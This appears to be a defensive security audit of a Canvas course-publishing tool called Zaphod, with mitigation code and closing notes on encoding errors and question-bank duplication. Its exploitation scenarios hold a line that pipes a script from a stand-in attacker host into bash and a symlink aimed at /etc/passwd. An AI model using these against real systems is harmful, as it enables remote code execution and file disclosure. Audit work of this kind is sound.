# Zaphod Security Assessment

## Executive Summary

This document provides a comprehensive security risk assessment of the Zaphod codebase, identifying potential vulnerabilities, explaining how they might be exploited, and suggesting mitigations.

**Overall Risk Level: MEDIUM**

The primary risks relate to credential handling, code execution patterns, and input validation. Most vulnerabilities require local access or compromised credentials to exploit.

---

## 1. Critical Vulnerabilities

### 1.1 Credential File Execution (HIGH)

**Location:** Multiple files (`canvas_client.py`, `sync_banks.py`, `import_quiz_bank.py`, `prune_quizzes.py`)

**Vulnerable Code:**
```python
ns: Dict[str, Any] = {}
exec(cred_file.read_text(encoding="utf-8"), ns)
api_key = ns["API_KEY"]
api_url = ns["API_URL"]
```

**Risk:** The credentials file is executed as Python code rather than parsed as data. If an attacker can modify the credentials file, they can execute arbitrary Python code with the permissions of the Zaphod process.

**Exploitation Scenario:**
1. Attacker gains write access to `~/.canvas/credentials.txt`
2. Attacker adds malicious code: `import os; os.system('curl attacker.com/shell.sh | bash')`
3. Next time Zaphod runs, the malicious code executes

**Mitigation:**
```python
# Instead of exec(), use a safe parser:
import configparser
config = configparser.ConfigParser()
config.read(cred_file)
api_key = config['canvas']['API_KEY']
api_url = config['canvas']['API_URL']

# Or use environment variables exclusively:
api_key = os.environ.get('CANVAS_API_KEY')
api_url = os.environ.get('CANVAS_API_URL')
```

**Severity:** HIGH - Arbitrary code execution
**Likelihood:** LOW - Requires write access to credential file
**Overall:** MEDIUM-HIGH

---

### 1.2 YAML Deserialization (MEDIUM)

**Location:** Multiple files using `yaml.safe_load()`

**Current Code:** Uses `yaml.safe_load()` which is safe.

**Status:** ✅ PROPERLY MITIGATED

The codebase correctly uses `yaml.safe_load()` instead of `yaml.load()`, preventing YAML deserialization attacks that could execute arbitrary Python code.

---

### 1.3 Path Traversal in File Operations (MEDIUM)

**Location:** `frontmatter_to_meta.py`, `publish_all.py`

**Vulnerable Pattern:**
```python
for folder in PAGES_DIR.rglob(f"*{ext}"):
    # Process files...
```

**Risk:** If an attacker can create symlinks in the pages directory, they might be able to:
- Read files outside the course directory
- Write to arbitrary locations

**Exploitation Scenario:**
1. Attacker creates symlink: `pages/evil.page -> /etc/passwd`
2. Zaphod reads and potentially publishes sensitive file contents

**Mitigation:**
```python
def safe_path(base: Path, target: Path) -> bool:
    """Ensure target is within base directory (no symlink escape)."""
    try:
        target.resolve().relative_to(base.resolve())
        return True
    except ValueError:
        return False

# Use before processing:
if not safe_path(PAGES_DIR, folder):
    print(f"[warn] Skipping suspicious path: {folder}")
    continue
```

**Severity:** MEDIUM
**Likelihood:** LOW - Requires ability to create files in course directory
**Overall:** LOW-MEDIUM

---

## 2. Medium Vulnerabilities

### 2.1 API Key Exposure in Logs (MEDIUM)

**Location:** Various scripts with verbose logging

**Risk:** API keys might be logged in debug output or error messages.

**Mitigation:**
```python
def mask_key(key: str) -> str:
    """Mask API key for safe logging."""
    if len(key) > 8:
        return key[:4] + "****" + key[-4:]
    return "****"

# In logging:
print(f"[info] Using API key: {mask_key(api_key)}")
```

### 2.2 Insufficient Input Validation (MEDIUM)

**Location:** `cli.py`, `scaffold_course.py`

**Vulnerable Code:**
```python
folder_name = f"{name.lower().replace(' ', '-')}.quiz"
folder_path = ctx.pages_dir / folder_name
folder_path.mkdir(parents=True, exist_ok=True)
```

**Risk:** Special characters in `name` could cause issues:
- `../` could create files outside intended directory
- Shell metacharacters if used in subprocess calls

**Mitigation:**
```python
import re

def sanitize_filename(name: str) -> str:
    """Create safe filename from user input."""
    # Remove or replace dangerous characters
    safe = re.sub(r'[^\w\s-]', '', name)
    safe = re.sub(r'[-\s]+', '-', safe).strip('-')
    if not safe:
        raise ValueError("Name results in empty filename")
    # Prevent path traversal
    if '..' in safe or safe.startswith('/'):
        raise ValueError("Invalid characters in name")
    return safe.lower()
```

### 2.3 HTTP Response Handling (MEDIUM)

**Location:** `sync_banks.py`, `canvas_client.py`

**Risk:** Responses from Canvas API are not always validated before use.

**Vulnerable Pattern:**
```python
resp = requests.post(url, headers=headers, data=data)
migration_data = resp.json()
migration_id = migration_data.get("id")  # Could be None or wrong type
```

**Mitigation:**
```python
def safe_json_get(data: dict, key: str, expected_type: type, default=None):
    """Safely get and validate JSON field."""
    value = data.get(key, default)
    if value is not None and not isinstance(value, expected_type):
        raise ValueError(f"Expected {expected_type} for {key}, got {type(value)}")
    return value
```

---

## 3. Low Vulnerabilities

### 3.1 Race Conditions in Watch Mode (LOW)

**Location:** `watch_and_publish.py`

**Risk:** The debounce mechanism and `PIPELINE_RUNNING` flag could have race conditions in edge cases.

**Mitigation:** Use proper threading locks (partially implemented with `threading.Lock`).

### 3.2 Temporary File Handling (LOW)

**Location:** `export_cartridge.py`

**Risk:** Temporary files might persist or be readable by other users.

**Mitigation:**
```python
import tempfile
with tempfile.NamedTemporaryFile(delete=True, suffix='.zip') as tf:
    # Use tf.name for temporary operations
    pass  # File auto-deleted
```

### 3.3 Error Message Information Disclosure (LOW)

**Location:** Various error handlers

**Risk:** Detailed error messages might reveal system paths or configuration.

**Mitigation:** Sanitize error messages before displaying to users.

---

## 4. Authentication & Authorization

### 4.1 Canvas API Token Security

**Current State:**
- Token stored in plaintext file
- File permissions not enforced by Zaphod
- Token has full course access

**Recommendations:**
1. Add file permission check:
```python
import stat
mode = os.stat(cred_file).st_mode
if mode & (stat.S_IRWXG | stat.S_IRWXO):
    print("[WARN] Credentials file is readable by group/others!")
    print("       Run: chmod 600 ~/.canvas/credentials.txt")
```

2. Support environment variables as alternative:
```python
api_key = os.environ.get('CANVAS_API_KEY') or read_from_file()
```

3. Consider supporting keyring/secret store:
```python
try:
    import keyring
    api_key = keyring.get_password("canvas", "api_key")
except ImportError:
    # Fall back to file
```

---

## 5. Network Security

### 5.1 HTTPS Enforcement

**Status:** ✅ Canvas API uses HTTPS by default

### 5.2 Certificate Validation

**Status:** ✅ Requests library validates certificates by default

### 5.3 Timeout Handling

**Risk:** Missing timeouts could cause hangs

**Mitigation:**
```python
# Add timeout to all requests
resp = requests.post(url, headers=headers, data=data, timeout=30)
```

---

## 6. Data Validation

### 6.1 Content Injection in Markdown

**Risk:** User-provided markdown could contain malicious content that gets rendered in Canvas.

**Status:** Canvas itself sanitizes HTML, so this is low risk.

### 6.2 QTI XML Injection

**Location:** `sync_banks.py`, `import_quiz_bank.py`

**Current Code:** Uses `xml.etree.ElementTree` which properly escapes content.

**Status:** ✅ PROPERLY MITIGATED via XML library

---

## 7. Recommendations Summary

### Immediate (High Priority)
1. **Replace `exec()` with safe credential parsing** - Critical security fix
2. **Add path traversal protection** - Prevent symlink attacks
3. **Add request timeouts** - Prevent hangs

### Short-term (Medium Priority)
4. **Sanitize user input for filenames** - Prevent path manipulation
5. **Add credential file permission checks** - Warn about insecure permissions
6. **Mask API keys in logs** - Prevent accidental exposure

### Long-term (Low Priority)
7. **Support environment variables for credentials** - Better container/CI support
8. **Add comprehensive input validation** - Defense in depth
9. **Implement structured logging** - Better audit trail

---

## 8. Secure Development Checklist

For future development:

- [ ] Never use `exec()` or `eval()` on external data
- [ ] Always use `yaml.safe_load()` not `yaml.load()`
- [ ] Validate and sanitize all user input
- [ ] Use parameterized queries/requests
- [ ] Check file paths are within expected directories
- [ ] Add timeouts to network requests
- [ ] Mask sensitive data in logs
- [ ] Handle errors without exposing system details

---

## 9. Unicode Corruption Analysis

**Question:** Why do unicode characters keep getting corrupted?

**Root Cause Analysis:**

The unicode corruption (e.g., `✓` becoming `Ã¢Å"â€œ`) is caused by **double encoding** or **encoding mismatch**:

1. **UTF-8 interpreted as Latin-1 (ISO-8859-1):**
   - Original: `✓` (U+2713) = UTF-8 bytes `E2 9C 93`
   - If read as Latin-1: `Ã¢` `Å"` `â€œ`

2. **Common causes:**
   - Editor saved as UTF-8, opened as Latin-1
   - Copy/paste between systems with different encodings
   - Git configured with wrong encoding
   - Terminal encoding mismatch

**Prevention:**
```python
# Always specify encoding explicitly:
with open(file, 'r', encoding='utf-8') as f:
    content = f.read()

# For files that might have BOM:
with open(file, 'r', encoding='utf-8-sig') as f:
    content = f.read()
```

**Git Configuration:**
```bash
git config --global core.quotepath false
git config --global i18n.commitencoding utf-8
git config --global i18n.logoutputencoding utf-8
```

**Editor Settings:**
- VS Code: Set `"files.encoding": "utf8"`
- Ensure no BOM is added to Python files

---

## 10. Question Bank Update Behavior

**Question:** Do banks get updated rather than duplicated if they change?

**Current Behavior:** Banks are **duplicated**, not updated.

The Canvas Content Migration API creates new questions each time. There's no built-in mechanism to update existing questions.

**Why This Happens:**
- Canvas question banks don't have a "replace" API
- QTI import always creates new items
- No question-level unique identifiers are preserved

**Potential Solutions:**

1. **Manual approach:** Delete bank before re-importing
```python
def delete_bank_if_exists(course_id, bank_name, api_url, api_key):
    """Delete existing bank before reimporting."""
    banks = list_question_banks(course_id, api_url, api_key)
    for bank in banks:
        if bank.get('title') == bank_name:
            delete_question_bank(course_id, bank['id'], api_url, api_key)
            break
```

2. **Hash-based change detection:**
```python
def get_bank_hash(bank_file: Path) -> str:
    """Get content hash for change detection."""
    return hashlib.md5(bank_file.read_bytes()).hexdigest()

# Skip if unchanged
if get_bank_hash(path) == get_cached_hash(path):
    print(f"[bank] {path.name} unchanged, skipping")
    continue
```

3. **Accept duplicates with versioning:**
- Append timestamp to bank names: `"Chapter 1 Questions (2024-01-21)"`
- Clean up old versions periodically

---

*Assessment Date: January 2026*
*Assessed By: Claude (Anthropic)*
